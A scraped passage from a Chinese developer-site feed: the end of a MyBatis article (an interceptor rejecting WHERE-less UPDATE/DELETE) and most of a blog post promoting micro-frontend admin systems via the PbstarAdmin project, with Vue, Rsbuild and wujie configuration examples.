        <span class="hljs-selector-tag">String</span> <span class="hljs-selector-tag">sql</span> = <span class="hljs-selector-tag">boundSql</span><span class="hljs-selector-class">.getSql</span>()<span class="hljs-selector-class">.trim</span>()<span class="hljs-selector-class">.toUpperCase</span>();
        <span class="hljs-selector-tag">if</span> ((sql.<span class="hljs-built_in">startsWith</span>(<span class="hljs-string">"UPDATE"</span>) || sql.<span class="hljs-built_in">startsWith</span>(<span class="hljs-string">"DELETE"</span>)) &amp;&amp; !sql.<span class="hljs-built_in">contains</span>(<span class="hljs-string">"WHERE"</span>)) {
            <span class="hljs-selector-tag">throw</span> <span class="hljs-selector-tag">new</span> <span class="hljs-selector-tag">RuntimeException</span>(<span class="hljs-string">"禁止执行不带WHERE条件的UPDATE/DELETE语句"</span>);
        }
        <span class="hljs-selector-tag">return</span> <span class="hljs-selector-tag">invocation</span><span class="hljs-selector-class">.proceed</span>();
    }
}
</code></pre>
</li>
</ul>
<h2 data-id="heading-26">总结</h2>
<p>MyBatis 是企业开发中最常用的持久层框架之一，核心优势是<strong>灵活的 SQL 控制</strong>和<strong>低入侵性</strong>。掌握其核心语法（动态 SQL、结果映射）、缓存机制、性能优化技巧，以及与 Spring Boot 的整合，是应对企业面试和实际开发的关键。在企业场景中，需根据业务复杂度选择 XML 或注解开发，结合分页、批量操作、关联查询等特性，提升开发效率和系统性能。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[做后台系统别再只会单体架构了，微前端才是更优解]]></title>    <link>https://juejin.cn/post/7584073390693974031</link>    <guid>https://juejin.cn/post/7584073390693974031</guid>    <pubDate>2025-12-16T08:29:54.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7584073390693974031" data-draft-id="7584203412197326874" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="做后台系统别再只会单体架构了，微前端才是更优解"/> <meta itemprop="keywords" content="前端,架构"/> <meta itemprop="datePublished" content="2025-12-16T08:29:54.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="初辰ge"/> <meta itemprop="url" content="https://juejin.cn/user/1961991576240190"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            做后台系统别再只会单体架构了，微前端才是更优解
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1961991576240190/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    初辰ge
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-16T08:29:54.000Z" title="Tue Dec 16 2025 08:29:54 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-16
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    1
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读10分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>在后台系统开发领域，传统的单体架构已经无法满足现代企业的复杂需求。本文将深入探讨为什么微前端架构是后台系统的更优选择，并通过开源项目 <strong>PbstarAdmin</strong> 的完整实践案例，展示如何构建高性能、可扩展的微前端后台系统。</p>
</blockquote>
<h2 data-id="heading-0">前言：单体架构的那些坑</h2>
<p>说实话，做后台系统开发这么多年，单体架构的痛点真是深有体会：</p>
<ul>
<li><strong>代码耦合严重</strong>：多个业务模块混杂在一起，修改一个功能可能影响到其他模块</li>
<li><strong>代码无法隔离</strong>：所有代码都在一个仓库中，无法进行物理隔离，权限管理困难</li>
<li><strong>构建速度缓慢</strong>：随着业务增长，项目体积越来越大，构建时间从几分钟到十几分钟不等</li>
<li><strong>技术栈锁定</strong>：整个项目被限制在单一技术栈，无法灵活选择最适合的技术方案</li>
<li><strong>团队协作困难</strong>：多人同时开发时，代码冲突频发，发布需要协调所有模块</li>
<li><strong>部署风险高</strong>：任何小改动都需要重新部署整个应用，风险巨大</li>
</ul>
<p>这些问题的根源在于传统的单体架构模式。在单体架构中，所有的业务功能都被打包在一个巨大的代码库中，就像一个臃肿的巨人，行动迟缓且容易摔倒。</p>
<h2 data-id="heading-1">微前端：一种可行的解决方案</h2>
<p>微前端（Micro Frontends）把前端应用拆分成多个小型、独立的部分。每个部分都能独立开发、测试、部署，最后组合成一个完整的应用。</p>
<p>这样做的好处很明显：</p>
<ul>
<li><strong>独立部署</strong>：改一个模块不用重新发布整个系统</li>
<li><strong>团队自治</strong>：每个团队管好自己的模块就行</li>
<li><strong>渐进迁移</strong>：不用一次性重写，可以慢慢来</li>
<li><strong>故障隔离</strong>：一个模块崩了不会拖垮整个应用</li>
</ul>
<h2 data-id="heading-2">PbstarAdmin：微前端架构的实践案例</h2>
<p>为了让大家更好地理解和实践微前端架构，我们开源了一个完整的微前端后台系统项目 —— <strong>PbstarAdmin</strong>。这个项目基于腾讯的 wujie 微前端框架，提供了一套经过实际业务验证的完整解决方案。</p>
<h3 data-id="heading-3">项目特色</h3>
<ul>
<li><strong>微前端架构</strong>：基于 wujie 框架，支持动态加载子应用，实现真正的模块隔离</li>
<li><strong>双重隔离机制</strong>：Git子模块 + Rsbuild构建，支持内外部子应用混合管理</li>
<li><strong>模块化设计</strong>：pnpm monorepo 管理，代码组织清晰，依赖管理高效</li>
<li><strong>组件复用</strong>：共享组件库，统一别名引用，提升开发效率</li>
<li><strong>工程化工具</strong>：完整的 Ptools 工具链，从创建到构建全流程自动化</li>
<li><strong>高性能构建</strong>：基于 Rsbuild，支持多环境配置，构建速度快</li>
</ul>
<h3 data-id="heading-4">微后台架构图</h3>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TB
    Main["主应用&lt;br/&gt;wujie框架&lt;br/&gt;路由管理 | 应用注册 | 状态共享"]

    Main --&gt; App1["内部子应用&lt;br/&gt;主仓库内&lt;br/&gt;独立构建部署"]
    Main --&gt; App2["外部子应用&lt;br/&gt;Git子模块&lt;br/&gt;独立构建部署"]

    App1 --&gt; Shared["共享资源层&lt;br/&gt;组件库 | 工具函数&lt;br/&gt;公共样式 | 图标资源"]
    App2 --&gt; Shared

    style Main fill:#e1f5ff,stroke:#01579b,stroke-width:2px
    style App1 fill:#f3e5f5,stroke:#4a148c,stroke-width:2px
    style App2 fill:#fff3e0,stroke:#e65100,stroke-width:2px
    style Shared fill:#e8f5e9,stroke:#1b5e20,stroke-width:2px
</code></pre>
<h3 data-id="heading-5">技术选型</h3>
<p>技术选型比较务实，都是现在主流的方案：</p>
<ul>
<li><strong>Vue 3</strong>： Composition API 开发体验不错</li>
<li><strong>Pinia</strong>：状态管理比 Vuex 简洁</li>
<li><strong>Element Plus</strong>：组件库成熟稳定</li>
<li><strong>Rsbuild</strong>：基于 Rspack，构建速度很快</li>
<li><strong>pnpm</strong>：monorepo 管理很方便</li>
<li><strong>wujie</strong>：腾讯的微前端方案，相对成熟</li>
</ul>
<h3 data-id="heading-6">项目结构</h3>
<p>整个项目结构比较清晰：</p>
<pre><code class="hljs language-perl" lang="perl">pbstar-admin/
├── main/                      <span class="hljs-comment"># 主应用（基座）</span>
├── apps/                      <span class="hljs-comment"># 子应用目录</span>
│   ├── app-common/            <span class="hljs-comment"># 公共子应用模块</span>
│   ├── <span class="hljs-keyword">system</span>/                <span class="hljs-comment"># 系统管理应用</span>
│   ├── example/               <span class="hljs-comment"># 示例应用</span>
│   ├── equipment/             <span class="hljs-comment"># 设备管理应用（外部子应用）</span>
│   └── apps.json              <span class="hljs-comment"># 子应用配置</span>
├── components/                <span class="hljs-comment"># 共享组件库</span>
├── assets/                    <span class="hljs-comment"># 共享资源</span>
└── tools/                     <span class="hljs-comment"># 工具模块（CLI）</span>
</code></pre>
<h3 data-id="heading-7">微应用配置</h3>
<p>在 <code>apps/apps.json</code> 中配置各个微应用的信息：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">[</span>
  <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"key"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"system"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"devPort"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">8801</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"proUrl"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"http://pbstar-admin-system.pbstar.cn/"</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"key"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"example"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"devPort"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">8802</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"proUrl"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"http://pbstar-admin-example.pbstar.cn/"</span>
  <span class="hljs-punctuation">}</span><span class="hljs-punctuation">,</span>
  <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"key"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"equipment"</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"devPort"</span><span class="hljs-punctuation">:</span> <span class="hljs-number">8803</span><span class="hljs-punctuation">,</span>
    <span class="hljs-attr">"proUrl"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"http://pbstar-admin-equipment.pbstar.cn/"</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">]</span>
</code></pre>
<h3 data-id="heading-8">主应用核心代码</h3>
<p>主应用负责整体布局、导航菜单管理和微应用加载：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// main/src/stores/apps.js</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">const</span> useAppsStore = <span class="hljs-title function_">defineStore</span>(<span class="hljs-string">"apps"</span>, <span class="hljs-function">() =&gt;</span> {
  <span class="hljs-keyword">const</span> myApps = <span class="hljs-title function_">ref</span>([]); <span class="hljs-comment">// 存储用户的应用</span>
  <span class="hljs-keyword">const</span> appId = <span class="hljs-title function_">ref</span>(<span class="hljs-number">0</span>); <span class="hljs-comment">// 存储当前激活的应用</span>

  <span class="hljs-keyword">const</span> <span class="hljs-title function_">setApps</span> = (<span class="hljs-params">apps</span>) =&gt; {
    myApps.<span class="hljs-property">value</span> = apps.<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">item</span>) =&gt;</span> {
      <span class="hljs-keyword">return</span> {
        <span class="hljs-attr">id</span>: item.<span class="hljs-property">id</span>,
        <span class="hljs-attr">key</span>: item.<span class="hljs-property">key</span>,
        <span class="hljs-attr">name</span>: item.<span class="hljs-property">name</span>,
        <span class="hljs-attr">icon</span>: item.<span class="hljs-property">icon</span>,
        <span class="hljs-attr">group</span>: item.<span class="hljs-property">group</span>,
        <span class="hljs-attr">navs</span>: [],
        <span class="hljs-attr">navsTree</span>: [],
      };
    });
  };

  <span class="hljs-keyword">const</span> <span class="hljs-title function_">setAppId</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params">{ id, key }</span>) =&gt; {
    <span class="hljs-keyword">let</span> aId = <span class="hljs-number">0</span>;
    <span class="hljs-keyword">if</span> (id) {
      aId = id;
    } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (key) {
      <span class="hljs-keyword">const</span> app = myApps.<span class="hljs-property">value</span>.<span class="hljs-title function_">find</span>(<span class="hljs-function">(<span class="hljs-params">item</span>) =&gt;</span> item.<span class="hljs-property">key</span> === key);
      <span class="hljs-keyword">if</span> (app) aId = app.<span class="hljs-property">id</span>;
    }
    <span class="hljs-keyword">if</span> (aId) {
      <span class="hljs-keyword">const</span> navRes = <span class="hljs-keyword">await</span> request.<span class="hljs-title function_">get</span>({
        <span class="hljs-attr">url</span>: <span class="hljs-string">"/main/getMyNavListByAppId"</span>,
        <span class="hljs-attr">data</span>: { <span class="hljs-attr">appId</span>: aId },
      });
      <span class="hljs-keyword">if</span> (navRes.<span class="hljs-property">code</span> !== <span class="hljs-number">200</span>) {
        <span class="hljs-title class_">ElMessage</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">"获取应用导航失败！请稍后重试"</span>);
        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;
      }
      <span class="hljs-title function_">setAppNavs</span>(aId, navRes.<span class="hljs-property">data</span>);
    }
    appId.<span class="hljs-property">value</span> = aId;
    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
  };

  <span class="hljs-keyword">return</span> {
    appId,
    setApps,
    setAppId,
    getApp,
    getApps,
    hasAppNav,
  };
});
</code></pre>
<h3 data-id="heading-9">导航菜单管理</h3>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// main/src/components/layout/layout.js</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">useNavMenu</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">const</span> router = <span class="hljs-title function_">useRouter</span>();
  <span class="hljs-keyword">const</span> route = <span class="hljs-title function_">useRoute</span>();
  <span class="hljs-keyword">const</span> appsStore = <span class="hljs-title function_">useAppsStore</span>();

  <span class="hljs-keyword">const</span> activeIndex = <span class="hljs-title function_">ref</span>(<span class="hljs-string">"1"</span>);
  <span class="hljs-keyword">const</span> list = <span class="hljs-title function_">ref</span>([]);
  <span class="hljs-keyword">const</span> listTree = <span class="hljs-title function_">ref</span>([]);

  <span class="hljs-keyword">const</span> <span class="hljs-title function_">updateNavData</span> = (<span class="hljs-params"/>) =&gt; {
    <span class="hljs-keyword">if</span> (appsStore.<span class="hljs-property">appId</span>) {
      <span class="hljs-keyword">const</span> app = appsStore.<span class="hljs-title function_">getApp</span>();
      <span class="hljs-keyword">if</span> (!app) <span class="hljs-keyword">return</span>;
      list.<span class="hljs-property">value</span> = app.<span class="hljs-property">navs</span>;
      listTree.<span class="hljs-property">value</span> = app.<span class="hljs-property">navsTree</span>;
    } <span class="hljs-keyword">else</span> {
      list.<span class="hljs-property">value</span> = [
        {
          <span class="hljs-attr">id</span>: <span class="hljs-number">1</span>,
          <span class="hljs-attr">name</span>: <span class="hljs-string">"首页"</span>,
          <span class="hljs-attr">url</span>: <span class="hljs-string">"/admin/pHome"</span>,
          <span class="hljs-attr">icon</span>: <span class="hljs-string">"el-icon-house"</span>,
        },
      ];
      listTree.<span class="hljs-property">value</span> = list.<span class="hljs-property">value</span>;
    }
  };

  <span class="hljs-keyword">const</span> <span class="hljs-title function_">selectNav</span> = (<span class="hljs-params">val</span>) =&gt; {
    activeIndex.<span class="hljs-property">value</span> = val;
    <span class="hljs-keyword">const</span> url = list.<span class="hljs-property">value</span>.<span class="hljs-title function_">find</span>(<span class="hljs-function">(<span class="hljs-params">item</span>) =&gt;</span> item.<span class="hljs-property">id</span>.<span class="hljs-title function_">toString</span>() === val)?.<span class="hljs-property">url</span>;
    <span class="hljs-keyword">if</span> (url) {
      router.<span class="hljs-title function_">push</span>(url);
    }
  };

  <span class="hljs-keyword">return</span> {
    listTree,
    activeIndex,
    selectNav,
    updateNavData,
    updateActiveIndex,
  };
}
</code></pre>
<h3 data-id="heading-10">构建配置</h3>
<p>使用 Rsbuild 进行高性能构建配置：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// rsbuild.config.mjs</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineConfig</span>({
  <span class="hljs-attr">plugins</span>: [<span class="hljs-title function_">pluginVue</span>(), <span class="hljs-title function_">pluginSass</span>(), <span class="hljs-title function_">distZipPlugin</span>()],
  <span class="hljs-attr">output</span>: { <span class="hljs-attr">legalComments</span>: <span class="hljs-string">"none"</span> },
  <span class="hljs-attr">resolve</span>: {
    <span class="hljs-attr">alias</span>: {
      <span class="hljs-string">"@Pcomponents"</span>: <span class="hljs-string">"./components"</span>,
      <span class="hljs-string">"@Passets"</span>: <span class="hljs-string">"./assets"</span>,
    },
  },
  <span class="hljs-attr">server</span>: {
    <span class="hljs-attr">proxy</span>: {
      <span class="hljs-string">"/api"</span>: {
        <span class="hljs-attr">target</span>: <span class="hljs-keyword">import</span>.<span class="hljs-property">meta</span>.<span class="hljs-property">env</span>.<span class="hljs-property">PUBLIC_API_BASE_URL</span>,
        <span class="hljs-attr">pathRewrite</span>: { <span class="hljs-string">"^/api"</span>: <span class="hljs-string">""</span> },
        <span class="hljs-attr">changeOrigin</span>: <span class="hljs-literal">true</span>,
      },
    },
  },
  <span class="hljs-attr">environments</span>: {
    <span class="hljs-attr">main</span>: mainConfig,
    ...<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">fromEntries</span>(apps.<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">app</span>) =&gt;</span> [app.<span class="hljs-property">key</span>, <span class="hljs-title function_">createAppConfig</span>(app)])),
  },
});
</code></pre>
<h3 data-id="heading-11">Pcomponents 共享组件库</h3>
<p>Pcomponents 是项目的共享组件库，通过 <code>@Pcomponents</code> 别名统一引用，实现跨应用组件复用。</p>
<h4 data-id="heading-12">组件库结构</h4>
<pre><code class="hljs language-csharp" lang="csharp">components/
├── <span class="hljs-keyword">base</span>/                      <span class="hljs-meta"># 基础组件</span>
│   ├── p-button/              <span class="hljs-meta"># 按钮组件</span>
│   ├── p-dialog/              <span class="hljs-meta"># 对话框组件</span>
│   ├── p-table/               <span class="hljs-meta"># 表格组件</span>
│   ├── p-search/              <span class="hljs-meta"># 搜索组件</span>
│   ├── p-title/               <span class="hljs-meta"># 标题组件</span>
│   ├── p-item/                <span class="hljs-meta"># 表单项组件</span>
│   ├── p-icon/                <span class="hljs-meta"># 图标组件</span>
│   └── p-collapse/            <span class="hljs-meta"># 折叠面板组件</span>
├── layout/                    <span class="hljs-meta"># 布局组件</span>
│   └── p-twinBox/             <span class="hljs-meta"># 双栏布局组件</span>
├── more/                      <span class="hljs-meta"># 高级组件</span>
│   ├── p-codeView/            <span class="hljs-meta"># 代码查看器</span>
│   ├── p-iconSelect/          <span class="hljs-meta"># 图标选择器</span>
│   └── p-verificationCode/    <span class="hljs-meta"># 验证码组件</span>
├── page/                      <span class="hljs-meta"># 页面级组件</span>
│   ├── <span class="hljs-number">403.</span>vue                <span class="hljs-meta"># 403 错误页</span>
│   └── <span class="hljs-number">404.</span>vue                <span class="hljs-meta"># 404 错误页</span>
└── index.js                   <span class="hljs-meta"># 组件统一导出</span>
</code></pre>
<h4 data-id="heading-13">使用方式</h4>
<p><strong>1. 在 rsbuild.config.mjs 中配置别名：</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-attr">resolve</span>: {
  <span class="hljs-attr">alias</span>: {
    <span class="hljs-string">"@Pcomponents"</span>: <span class="hljs-string">"./components"</span>,
    <span class="hljs-string">"@Passets"</span>: <span class="hljs-string">"./assets"</span>,
  },
}
</code></pre>
<p><strong>2. 在子应用中按需引入：</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 引入多个组件</span>
<span class="hljs-keyword">import</span> { pTable, pDialog, pButton, pItem } <span class="hljs-keyword">from</span> <span class="hljs-string">"@Pcomponents"</span>;

<span class="hljs-comment">// 引入单个组件</span>
<span class="hljs-keyword">import</span> { pIcon } <span class="hljs-keyword">from</span> <span class="hljs-string">"@Pcomponents"</span>;
</code></pre>
<p><strong>3. 使用示例：</strong></p>
<pre><code class="hljs language-vue" lang="vue">&lt;template&gt;
  &lt;div&gt;
    &lt;p-title title="用户管理" /&gt;
    &lt;p-search :options="searchOptions" @search="handleSearch" /&gt;
    &lt;p-table :data="tableData" :columns="columns" @row-click="handleRowClick" /&gt;
    &lt;p-dialog v-model="dialogVisible" title="编辑用户"&gt;
      &lt;p-item label="用户名" prop="username"&gt;
        &lt;el-input v-model="form.username" /&gt;
      &lt;/p-item&gt;
    &lt;/p-dialog&gt;
  &lt;/div&gt;
&lt;/template&gt;

&lt;script setup&gt;
import { pTitle, pSearch, pTable, pDialog, pItem } from "@Pcomponents";

const searchOptions = [
  { label: "用户名", prop: "username", type: "input" },
  { label: "状态", prop: "status", type: "select" },
];

const columns = [
  { label: "用户名", prop: "username" },
  { label: "邮箱", prop: "email" },
  { label: "状态", prop: "status" },
];
&lt;/script&gt;
</code></pre>
<h4 data-id="heading-14">组件特点</h4>
<p><strong>1. 统一的设计风格</strong></p>
<ul>
<li>基于 Element Plus 二次封装</li>
<li>统一的 UI 规范和交互体验</li>
<li>符合后台系统的业务场景</li>
</ul>
<p><strong>2. 高度可配置</strong></p>
<ul>
<li>通过 props 灵活配置组件行为</li>
<li>提供丰富的插槽支持定制化</li>
<li>支持事件回调扩展功能</li>
</ul>
<p><strong>3. 开箱即用</strong></p>
<ul>
<li>封装了常见的业务逻辑</li>
<li>减少重复代码，提升开发效率</li>
<li>降低学习成本，新手友好</li>
</ul>
<p><strong>4. 跨应用复用</strong></p>
<ul>
<li>通过 <code>@Pcomponents</code> 别名在所有子应用中统一引用</li>
<li>monorepo 管理，修改后所有应用自动更新</li>
<li>避免组件重复开发和维护成本</li>
</ul>
<h3 data-id="heading-15">代码隔离的双重机制</h3>
<h4 data-id="heading-16">传统方案的局限性</h4>
<p>之前用过一些微前端方案，发现隔离做得并不好：</p>
<ul>
<li><strong>代码都在一起</strong>：所有子应用代码混在一个仓库，权限控制很麻烦</li>
<li><strong>依赖经常冲突</strong>：这个子应用要Vue3，那个要Vue2，构建时各种问题</li>
<li><strong>构建互相影响</strong>：一个子应用构建失败了，整个项目都跑不起来</li>
<li><strong>版本管理混乱</strong>：没法单独给某个业务模块打版本标签</li>
</ul>
<h4 data-id="heading-17">Git子模块 + Rsbuild构建的双重隔离</h4>
<p>采用 <strong>Git子模块 + Rsbuild构建</strong> 的双重隔离，把代码隔离做到了物理层面。</p>
<p><strong>1. Git子模块隔离</strong></p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># .gitmodules 配置</span>
[submodule <span class="hljs-string">"apps/equipment"</span>]
	path = apps/equipment
	url = https://github.com/pbstar/pbstar-admin-quipment.git
</code></pre>
<p><strong>内部子应用（in类型）</strong>：</p>
<ul>
<li>代码放在主仓库里，适合核心业务</li>
<li>团队协作方便，代码复用容易</li>
<li>构建起来也快</li>
</ul>
<p><strong>外部子应用（out类型）</strong>：</p>
<ul>
<li>用Git子模块管理，完全独立的仓库</li>
<li>适合业务团队或者需要保密的模块</li>
<li>版本控制完全独立</li>
</ul>
<p><strong>2. Rsbuild构建隔离</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// rsbuild.config.mjs - 每个子应用单独的配置</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">createAppConfig</span> = (<span class="hljs-params">app</span>) =&gt; {
  <span class="hljs-keyword">const</span> basePath = <span class="hljs-string">`./apps/<span class="hljs-subst">${app.key}</span>`</span>;
  <span class="hljs-keyword">return</span> {
    <span class="hljs-attr">source</span>: {
      <span class="hljs-attr">entry</span>: { <span class="hljs-attr">index</span>: <span class="hljs-string">`<span class="hljs-subst">${basePath}</span>/src/main.js`</span> },
    },
    <span class="hljs-attr">output</span>: {
      <span class="hljs-attr">distPath</span>: { <span class="hljs-attr">root</span>: <span class="hljs-string">`./build/dist/<span class="hljs-subst">${app.key}</span>`</span> },
    },
    <span class="hljs-attr">resolve</span>: {
      <span class="hljs-attr">alias</span>: {
        <span class="hljs-string">"@"</span>: basePath + <span class="hljs-string">"/src"</span>,
      },
    },
    <span class="hljs-attr">plugins</span>: [
      <span class="hljs-title function_">checkUniqueKeyPlugin</span>({
        <span class="hljs-attr">checkPath</span>: <span class="hljs-string">`<span class="hljs-subst">${basePath}</span>/src`</span>,
        <span class="hljs-attr">checkKeys</span>: [<span class="hljs-string">"btnkey"</span>],
      }),
    ],
  };
};
</code></pre>
<p><strong>3. 实际效果</strong></p>
<p><strong>权限管理</strong>：</p>
<ul>
<li>仓库级别权限：外部子应用可以单独设置Git权限</li>
